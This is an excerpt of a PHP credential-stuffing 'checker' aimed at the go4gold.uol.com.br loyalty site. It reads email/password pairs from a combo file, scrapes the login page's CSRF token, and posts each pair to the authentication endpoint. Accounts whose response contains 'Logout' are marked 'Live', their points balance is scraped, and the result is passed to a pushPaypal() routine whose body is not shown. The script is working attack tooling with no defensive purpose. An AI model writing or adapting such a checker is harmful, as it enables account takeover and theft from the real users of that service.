...
class cURL {
    ...
    function doRequest($method, $url) {
        ...
        if ($method == 'POST') {
            ...
            curl_setopt($ch, CURLOPT_POSTFIELDS, 'redir=https%3A%2F%2Fgo4gold.uol.com.br%2Fpt-br%2Fconta&e-mail='.$email.'&password='.$pwd.'&5cc619282d0f7dd33c18f31e55fb19f3='.$token.'');
        }
...
if(file_exists(getcwd().'/MULTISON.txt')) {
	...
	$a = new cURL();
    $b = $a->get("https://go4gold.uol.com.br/pt-br/login");
 echo   $token = getStr($b,'type="hidden" name="5cc619282d0f7dd33c18f31e55fb19f3" id="5cc619282d0f7dd33c18f31e55fb19f3" value="','"');
	$c = new cURL();
    $d = $c->post("https://go4gold.uol.com.br/pt-br/authentication");
	//$b = $a->get("https://go4gold.uol.com.br/pt-br/conta");
...
$checked++;
	...
	if($d){
		...
		if (stristr($d,'Logout') !== false) {
			$saldo = getStr($d,'Você têm <strong>','</strong> np.');
			$xyz = "<b style=\"color:green\">Live</b> =>  <b style=\"color:white\" >$email</b> | <b style=\"color:white\">$pwd<b/> | <b style=\"color:red\">Pontos: $saldo</b> | <b style=\"color:red\">#TechnologyChecker</b>";
            $live[] = $xyz;
            unset($emails[$k]);
            pushPaypal($xyz);
